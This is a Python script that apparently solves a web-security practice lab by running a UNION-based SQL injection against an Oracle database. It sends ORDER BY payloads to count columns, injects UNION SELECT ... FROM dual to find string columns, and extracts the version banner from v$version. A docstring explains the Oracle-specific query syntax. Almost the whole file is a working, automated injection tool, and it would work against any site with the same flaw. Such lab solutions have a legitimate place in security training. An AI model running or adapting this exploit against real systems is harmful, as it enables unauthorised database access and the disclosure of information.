''' On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table,
 you will still need to include the FROM keyword followed by a valid table name.
There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual 

query to find database of oracle : SELECT banner FROM v$version,
SELECT version FROM v$instance

'''

import requests 
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def numberof_column(url):
    path="/filter?category=Gifts"
    for i in range(1,50):
        payload = "'+order+by+{}+--".format(i)
        res = requests.get(url+path+payload,proxies=proxies,verify=False)
        if res.status_code != 200:
            return i-1
    return False

def datatypeof_column(url,ncolumn):
    print("[+] Figuring string datatype of columns.....")
    column_list = []
    path = "/filter?category=Gifts"
    for i in range(1,ncolumn+1):
        payload_list = ['null']*ncolumn
        payload_list[i-1] = "'A'"
        payload = "'+union+select+"+",+".join(payload_list)+"+from+dual+--"
        res = requests.get(url+path+payload,proxies=proxies,verify=False)
        if res.status_code == 200:
            column_list.append(str(i))
    print("column of str datatype are : ",column_list)
    return column_list


def get_version(url,ncolumn,lcolumn):
    path="/filter?category=Gifts"
    for i in range(1,len(lcolumn)+1):
        if str(i) in lcolumn:
            payload_lis = ['null']*ncolumn
            payload_lis[i-1] = "banner"
            payload = "'union+select+"+",+".join(payload_lis)+"+from v$version+--"
            res = requests.get(url+path+payload,proxies=proxies,verify=False)
            if res.status_code == 200:
                soup = BeautifulSoup(res.text,'html.parser')
                version = soup.find(string=re.compile(".*Oracle\sDatabase*."))
                print("Database version is = ",version)
                return version
            
if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[+] Usage : python3 {} <url> <string that is asked>".format(sys.argv[0]))
        print("[+] Example : python3 {} www.example.com '2fdf'".format(sys.argv[0]))
        sys.exit(-1)
    
    print("[+] Figuring number of columns......")
    ncolumn = numberof_column(url)
    print("there are {} columns".format(ncolumn))
    lcolumn = datatypeof_column(url,ncolumn)
    print("[+] Getting the version of oracle database")
    verssion = get_version(url,ncolumn,lcolumn)
    if verssion:
        print("**********  LAB SOLVED  ************")
